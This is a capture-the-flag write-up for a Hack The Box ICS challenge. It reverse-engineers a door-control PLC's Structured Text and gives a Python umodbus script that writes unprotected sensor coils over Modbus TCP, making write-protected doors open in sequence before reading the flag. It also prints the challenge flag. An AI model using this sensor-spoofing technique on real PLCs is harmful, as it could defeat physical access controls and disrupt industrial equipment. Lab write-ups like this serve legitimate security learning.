# Breach - CTF Writeup

**Category:** ICS/SCADA, Modbus TCP, IEC 61131-3 Structured Text

**Author:** Atlas

**Date:** 2026-07-03

**Tools Used:** Python 3 (`umodbus`), Modbus TCP

A physical-security bypass challenge: a facility's door-control PLC exposes its I/O over Modbus TCP. The objective is to trigger the doors to open in a specific order — `[door_3, door_0, door_4, door_1, door_2]`, sequentially — to "infiltrate the building" and read the flag from the PLC's holding registers.

Three files were provided:
- `Instructions.txt` — mission rules
- `client.py` — a `umodbus` client stub pointed at `127.0.0.1:502`
- `door_control_subsystem.st` — the PLC's IEC 61131-3 Structured Text program

Key rules from `Instructions.txt`:
1. Doors must open in order `door_3, door_0, door_4, door_1, door_2`, sequentially.
2. The door coils are Modbus **write-restricted** — they cannot be commanded directly.
3. Sensors are "hardwired" to coils — writing a sensor coil alters the sensor signal the PLC logic reads.
4. The system resets ~2 minutes after mission completion.
5. The flag appears in holding registers starting at address 4 once the mission completes.

## Source Code Analysis

### Overview

`door_control_subsystem.st` defines 5 doors and 15 sensors, each mapped to a specific bit via IEC addressing (`%QX<byte>.<bit>`), plus a `system_active` flag and five `TON` (on-delay timer) blocks — one per door:

```st
Door_0 AT %Q4.0 : BOOL := 0;
...
sensor_0 AT %QX8.0 : BOOL := 0;
...
TON0(IN := NOT(Door_4) AND NOT(Door_3) AND NOT(Door_2) AND NOT(Door_1)
        AND sensor_4 AND NOT(sensor_2) AND sensor_1 AND sensor_0 AND system_active,
     PT := T#8000ms);
Door_0 := TON0.Q;
```

A `TON` only asserts `Q` (true) once its `IN` condition has held continuously for the full preset time `PT`; `Q` drops immediately the instant `IN` goes false. Each door's `IN` condition requires **every other door to be closed** (`NOT(Door_x)` for all other doors) — meaning at most one door can ever be open at a time. This is what makes "sequential" in the mission rules a hard constraint rather than a suggestion: to move to the next door, the currently open one has to be forced shut first.

Modbus coil addresses aren't given directly — they have to be derived from the IEC byte.bit notation using `address = byte*8 + bit`:

| Signal | IEC Address | Modbus Coil |
|---|---|---|
| `system_active` | %QX75.2 | 602 |
| `Door_0..4` | %Q4.0 – %Q4.4 | 32–36 |
| `sensor_0..4` | %QX8.0 – %QX8.4 | 64–68 |
| `sensor_5..9` | %QX37.0 – %QX37.4 | 296–300 |
| `sensor_10` | %QX52.0 | 416 |
| `sensor_11` | %QX52.6 | 422 |
| `sensor_12..14` | %QX16.6, %QX16.7, %QX16.0 | 134, 135, 128 |

A quick probe confirmed the write-restriction described in the instructions: writing a sensor coil (e.g. address 64) sticks on readback, while writing a door coil (e.g. address 32) gets Modbus-ACK'd but silently reverts to its old value — the PLC accepts the write at the protocol level but the door output itself is protected.

### The Plan

Extracting each door's `IN` condition from the ST source gives the exact sensor states needed:

| Door | `PT` | Required sensors | Also requires |
|---|---|---|---|
| Door_3 | 5000ms | s13=1, s12=1, s11=0, s10=1 | all other doors closed |
| Door_0 | 8000ms | s4=1, s2=0, s1=1, s0=1 | all other doors closed |
| Door_4 | 8000ms | s14=1, s13=1, s12=1, s10=1 | all other doors closed |
| Door_1 | 5000ms | s7=1, s6=0, s5=1, s0=1 | all other doors closed |
| Door_2 | 8000ms | s11=1, s7=0, s10=1, s5=1 | all other doors closed |

`system_active` (coil 602) must be `1` throughout — it gates every door's `IN` condition and isn't assigned anywhere in the program, so it's purely operator-controlled.

Since only one door can be open at a time, the exploit is a five-phase state machine: set the sensor combination for a door, wait past its `PT`, then before moving to the next door, flip **one** of that door's sensors to break its `IN` condition (closing it instantly) while simultaneously satisfying the next door's requirements. A few of these transitions conveniently overlap — e.g. breaking Door_3 by setting `sensor_11=1` also happens to be exactly what Door_2 needs later, and breaking Door_1 via `sensor_7=0` is simultaneously Door_2's `NOT sensor_7` requirement — so the sequence chains cleanly with minimal extra writes.

---

## Exploitation

### Overview

Built a Python script on top of the provided `umodbus` client stub that: enables `system_active`, then for each door in the required order writes that door's sensor combination via `write_single_coil` and polls `read_coils` on the door's own address until it latches open, before moving to the next phase.

### Commands Used

**Input:** Core write/poll helpers and the phase sequence (full script saved as `solve.py`).

```python
def write_coil(addr, value):
    msg = tcp.write_single_coil(slave_id=1, address=addr, value=value)
    return tcp.send_message(msg, sock)

def hold_until_door(door_num, coil_values, timeout=25, interval=1):
    for a, v in coil_values.items():
        write_coil(a, v)
    for i in range(int(timeout/interval)):
        if read_coil(DOOR[door_num]) == 1:
            return True
        sleep(interval)
    return False

# Phase 1: Door_3
hold_until_door(3, {SYSTEM_ACTIVE: 1, SENSOR[10]: 1, SENSOR[12]: 1, SENSOR[13]: 1, SENSOR[11]: 0})
# Phase 2: break Door_3 (s11=1), open Door_0
hold_until_door(0, {SYSTEM_ACTIVE: 1, SENSOR[11]: 1, SENSOR[0]: 1, SENSOR[1]: 1, SENSOR[4]: 1, SENSOR[2]: 0, ...})
# Phase 3: break Door_0 (s4=0), open Door_4
# Phase 4: break Door_4 (s14=0), open Door_1
# Phase 5: break Door_1 (s7=0), open Door_2 (final)
```

**Output:**
```
[*] Waiting for Door_3...
[+] Door_3 OPEN (t~6.0s)
[*] Waiting for Door_0...
[+] Door_0 OPEN (t~9.0s)
[*] Waiting for Door_4...
[+] Door_4 OPEN (t~8.0s)
[*] Waiting for Door_1...
[+] Door_1 OPEN (t~6.0s)
[*] Waiting for Door_2...
[+] Door_2 OPEN (t~9.0s)
```

All 5 doors opened in the exact required order, confirming the address mapping and sensor logic derivation.

**Input:** Read the flag from holding registers starting at address 4.

```python
msg = tcp.read_holding_registers(slave_id=1, starting_address=4, quantity=80)
regs = tcp.send_message(msg, sock)
chars = ''.join(chr(r) if r != 0 else '' for r in regs)
```

**Output:**
```
Registers: [72, 84, 66, 123, 109, 49, 53, 53, ... 33, 125, 0, 0, ...]
flag: HTB{m15510n_4cc0mp115h3d_f4c1117y_1s_8234ch3d!}
```

Each holding register holds one ASCII character of the flag (not two bytes packed per register, as might be assumed) — the first read attempt used `quantity=20`, which truncated the flag mid-string; bumping to `quantity=80` captured the full string plus trailing zero-padding.

### Solution

**Answer:** `HTB{m15510n_4cc0mp115h3d_f4c1117y_1s_8234ch3d!}`

**Summary:** The PLC's door coils were Modbus-write-protected, but the sensor coils that feed each door's `TON`-gated boolean logic were not. Reverse-engineering the Structured Text revealed that every door's opening condition required all other doors closed, forcing a strict one-door-at-a-time state machine. By deriving Modbus coil addresses from the IEC `%QX<byte>.<bit>` notation (`byte*8+bit`) and extracting each door's exact sensor/timer requirements from its `TON` block, a five-phase script could set the right sensor combination, wait out the timer, and flip one sensor to close the current door while opening the next — reproducing the mission's required physical sequence purely through indirect sensor manipulation.

**Scripts:**
- `solve.py` — full Modbus exploit: enables the system, drives the 5-door sequence, and reads the flag.

---

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| Reading holding registers with `quantity=20` | Flag is one ASCII char per register, not packed 2-per-register — 20 registers only captured the first 20 characters, truncating the flag before the closing `}` | Confirm the register-to-flag encoding empirically (read wide, then trim) rather than assuming a packing scheme |
| Re-running the full sequence on the same instance after a successful completion + auto-reset | Coil writes became flaky/non-sticky (reverting within &lt;1s, sometimes &lt;0.5s) even under continuous re-assertion — likely instance-side state degraded by heavy repeated Modbus polling during debugging | Once a mission has been completed and the ~2-minute auto-reset fires, treat the instance as potentially "spent" for further experimentation; respawning a fresh Docker instance from the HTB panel restored clean, first-try-reliable coil behavior |
| Continuously re-writing all phase coils every 0.3s to fight the reversion above | Didn't help — the underlying instance state was corrupted, not a timing race | Distinguish a genuine protocol/timing issue (fixable with retries) from a corrupted remote environment (only fixable by restarting the instance) — burning time on the former when it's the latter wastes cycles |

---

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Flag | `HTB{m15510n_4cc0mp115h3d_f4c1117y_1s_8234ch3d!}` | Derived Modbus coil addresses from IEC `%QX` notation, reverse-engineered each door's `TON` timer condition from the Structured Text, and drove sensor coils through a 5-phase open/close sequence matching the required door order to unlock the flag in the holding registers |

---

## References

- [Modbus Application Protocol Specification](https://modbus.org/specs.php)
- [IEC 61131-3 Structured Text overview](https://en.wikipedia.org/wiki/Structured_text)
- [umodbus (Python Modbus client/server library)](https://github.com/AdvancedClimateSystems/uModbus)
